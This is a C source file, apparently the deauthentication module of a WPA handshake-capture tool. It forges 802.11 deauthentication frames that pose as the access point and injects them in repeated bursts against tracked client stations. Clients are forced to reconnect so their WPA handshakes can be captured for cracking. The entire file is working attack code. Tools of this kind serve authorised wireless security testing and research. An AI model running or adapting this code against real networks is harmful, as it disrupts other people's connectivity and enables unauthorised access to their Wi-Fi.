/*
 * killer.c - Deauthentication attack subsystem
 *
 * Manages the injection of IEEE 802.11 deauthentication frames to force
 * clients to reassociate with their access points, thereby triggering
 * WPA handshakes that can be captured. Uses a pipe for communication
 * from the packet dissector and maintains a hash table of target clients.
 */

#include <assert.h>
#include <fcntl.h>
#include <time.h>
#include <unistd.h>

#include <uthash.h>

#include "handler.h"
#include "handshake.h"
#include "ieee802.h"
#include "killer.h"
#include "params.h"
#include "terminal.h"

/*
 * Message structure for communication via pipe.
 * The dissector sends these messages to the killer to add/remove targets.
 */
struct message {
    zz_mac_addr station;         /* Client MAC address */
    zz_mac_addr bssid;           /* Access point BSSID */
    zz_packet_outcome outcome;   /* Reason for tracking/untracking */
};

/*
 * Target structure for deauthentication attacks.
 * Each target represents a client station that needs to be deauthenticated.
 * Stored in a hash table keyed by (station, bssid) tuple.
 */
struct zz_target {
    zz_mac_addr station;         /* Client MAC address (part of key) */
    zz_mac_addr bssid;           /* Access point BSSID (part of key) */
    uint16_t sequence_control;   /* Sequence number for deauth frames */
    time_t schedule;             /* When to send next deauth (Unix timestamp) */
    unsigned attempts;           /* Remaining deauth attempts before giving up */
    UT_hash_handle hh;           /* uthash handle */
};

/*
 * Add or update a target in the killer's target list.
 * If the target doesn't exist, creates it with a random sequence number.
 * If it exists, updates its schedule.
 *
 * Parameters:
 *   zz - Handler with configuration
 *   killer - Killer subsystem
 *   target - Target information (station, bssid, schedule)
 */
static void set_target(zz_handler *zz, zz_killer *killer,
                       const struct zz_target *target) {
    struct zz_target *tmp;

    /* Try to find existing target using (station, bssid) as composite key */
    HASH_FIND(hh, killer->targets, &target->station, 2 * sizeof(zz_mac_addr), tmp);

    if (tmp == NULL) {
        /* New target - create and add to hash table */
        tmp = malloc(sizeof(struct zz_target));
        assert(tmp != NULL);
        *tmp = *target;
        HASH_ADD(hh, killer->targets, station, 2 * sizeof(zz_mac_addr), tmp);

        /* Start with a randomized sequence number to make frames look more natural */
        tmp->sequence_control = rand();
    }
    /* Existing target - just update the schedule */
    else {
        tmp->schedule = target->schedule;
    }

    /* Reset/set the maximum number of deauth attempts */
    tmp->attempts = zz->setup.killer_max_attempts;
}

/*
 * Remove a target from the killer's target list.
 * Called when a handshake is successfully captured.
 *
 * Parameters:
 *   killer - Killer subsystem
 *   target - Target to remove (only station and bssid are used as key)
 */
static void del_target(zz_killer *killer, const struct zz_target *target) {
    struct zz_target *tmp;

    /* Look up the target */
    HASH_FIND(hh, killer->targets, &target->station, 2 * sizeof(zz_mac_addr), tmp);
    assert(tmp != NULL);

    /* Delete it from the hash table and free memory */
    HASH_DEL(killer->targets, tmp);
    free(tmp);
}

/*
 * Send deauthentication frames to a target.
 * Constructs and injects IEEE 802.11 deauthentication frames via pcap_inject.
 * Sends n_deauths frames in a burst (configurable via -d option).
 *
 * Frame structure:
 *   - Radiotap header (capture metadata)
 *   - IEEE 802.11 MAC header (deauth frame type, addresses)
 *   - Deauthentication payload (reason code)
 *
 * Parameters:
 *   zz - Handler with pcap handle and configuration
 *   target - Target to deauthenticate (station, bssid, sequence number)
 *
 * Returns:
 *   1 on success, 0 on injection failure
 */
static int kill_target(zz_handler *zz, struct zz_target *target) {
    int i;

    /* Deauthentication packet structure (packed for direct injection) */
    struct {
        struct ieee80211_radiotap_header radiotap_header;
        struct ieee80211_mac_header mac_header;
        struct ieee80211_deauthentication_header deauthentication_header;
    }
    __attribute__((__packed__)) packet = {{0}, {0}, {0}};

    /* Fill in the packet fields */

    /* Radiotap header (minimal - just the length) */
    packet.radiotap_header.length = htole16(sizeof(struct ieee80211_radiotap_header));

    /* MAC header - deauthentication frame */
    *(uint8_t *)&packet.mac_header = ZZ_FCF_DEAUTHENTICATION;  /* Frame type */
    zz_mac_addr_to_array(packet.mac_header.address_1, target->station);  /* Destination: client */
    zz_mac_addr_to_array(packet.mac_header.address_2, target->bssid);    /* Source: AP */
    zz_mac_addr_to_array(packet.mac_header.address_3, target->bssid);    /* BSSID: AP */

    /* Deauthentication payload - reason code */
    packet.deauthentication_header.reason = ZZ_DEAUTHENTICATION_REASON;

    /* Send a burst of deauth frames (typically 1, configurable via -d) */
    for (i = 0; i < zz->setup.n_deauths; i++) {
        /* Inject the packet onto the wireless interface */
        if (pcap_inject(zz->pcap, &packet, sizeof(packet)) == -1) {
            zz_error(zz, "Cannot inject the deauthentication packet");
            return 0;
        }

        /* Increment the sequence number for the next frame.
         * This makes each frame unique and avoids duplicate detection. */
        packet.mac_header.sequence_control =
            htole16(ZZ_DEAUTHENTICATION_SEQUENCE(target->sequence_control));
        target->sequence_control++;
    }

    /* Schedule the next deauthentication attempt */
    target->schedule += zz->setup.killer_interval;

    return 1;
}

/*
 * Initialize the killer subsystem.
 * Creates a non-blocking pipe for communication from the dissector thread.
 *
 * Parameters:
 *   killer - Killer structure to initialize
 */
void zz_killer_new(zz_killer *killer) {
    killer->targets = NULL;  /* Empty hash table */

    /* Create a non-blocking pipe for inter-thread communication.
     * The dissector writes messages (add/remove targets), and the
     * killer reads them during periodic runs. */
    assert(pipe(killer->pipe) == 0);
    assert(fcntl(killer->pipe[0], F_SETFL, O_NONBLOCK) == 0);  /* Non-blocking reads */
    assert(fcntl(killer->pipe[1], F_SETFL, O_NONBLOCK) == 0);  /* Non-blocking writes */
}

/*
 * Post a message to the killer via the pipe.
 * Called by the dissector (in main thread) to notify the killer (in dispatcher
 * thread) about clients that should be tracked or untracked.
 *
 * Parameters:
 *   killer - Killer subsystem
 *   station - Client MAC address
 *   bssid - Access point BSSID
 *   outcome - Packet processing outcome (indicates why client should be tracked)
 */
void zz_killer_post_message(zz_killer *killer,
                            zz_mac_addr station, zz_mac_addr bssid,
                            zz_packet_outcome outcome) {
    struct message message = {0};

    /* Prepare the message */
    message.station = station;
    message.bssid = bssid;
    message.outcome = outcome;

    /* Write to pipe (non-blocking, should never block since pipe is large enough) */
    assert(write(killer->pipe[1], &message,
           sizeof(struct message)) == sizeof(struct message));
}

/*
 * Run the killer subsystem (called periodically by dispatcher).
 * 1. Drains the message pipe to update the target list
 * 2. Scans the target list and sends deauth frames to scheduled targets
 *
 * This function is called every DISPATCHER_TIMEOUT second by the dispatcher thread.
 *
 * Parameters:
 *   zz - Handler with configuration and pcap handle
 *   killer - Killer subsystem
 *
 * Returns:
 *   1 on success, 0 on error (e.g., pcap_inject failure)
 */
int zz_killer_run(zz_handler *zz, zz_killer *killer) {
    struct message message;
    struct zz_target *tmp, *iterator;
    time_t now;

    /* Phase 1: Drain the message pipe and update target list */
    while (read(killer->pipe[0], &message,
           sizeof(struct message)) == sizeof(struct message)) {
        struct zz_target target = {0};

        /* Prepare the target key (station, bssid) */
        target.station = message.station;
        target.bssid = message.bssid;

        /* Process message based on outcome */
        if (message.outcome.new_client || message.outcome.track_client) {
            /* Add/update target: schedule deauth attack */
            target.schedule = time(NULL);

            /* If in grace period, delay the first deauth to allow natural handshake */
            if (message.outcome.grace_time) {
                target.schedule += ZZ_KILLER_GRACE_TIME;
            }

            set_target(zz, killer, &target);
        }
        /* Remove target: handshake captured successfully */
        else if (message.outcome.got_handshake) {
            del_target(killer, &target);
        }
    }

    /* Phase 2: Scan target list and perform scheduled deauthentications */
    now = time(NULL);
    HASH_ITER(hh, killer->targets, iterator, tmp) {
        char station_str[ZZ_MAC_ADDR_STRING_SIZE];
        char bssid_str[ZZ_MAC_ADDR_STRING_SIZE];

        /* Skip if not yet time to deauth this target */
        if (iterator->schedule > now) {
            continue;
        }

        /* Skip targets we've given up on (ran out of attempts) */
        if (iterator->attempts == 0) {
            continue;
        }

        /* Send deauth frames to this target */
        zz_mac_addr_sprint(station_str, iterator->station);
        zz_mac_addr_sprint(bssid_str, iterator->bssid);
        zz_log("Deauthenticating %s @ %s", station_str, bssid_str);

        if (!kill_target(zz, iterator)) {
            return 0;  /* Injection failed */
        }

        /* Decrement attempts counter and check if we should give up */
        if (--iterator->attempts == 0) {
            zz_log("Giving up with %s @ %s", station_str, bssid_str);
        }
    }

    return 1;
}

/*
 * Clean up and free the killer subsystem.
 * Closes the pipe and frees all targets from the hash table.
 *
 * Parameters:
 *   killer - Killer subsystem to free
 */
void zz_killer_free(zz_killer *killer) {
    struct zz_target *tmp, *target;

    /* Close the pipe */
    assert(close(killer->pipe[0]) == 0);
    assert(close(killer->pipe[1]) == 0);

    /* Free all targets from the hash table */
    HASH_ITER(hh, killer->targets, target, tmp) {
        HASH_DEL(killer->targets, target);
        free(target);
    }
}
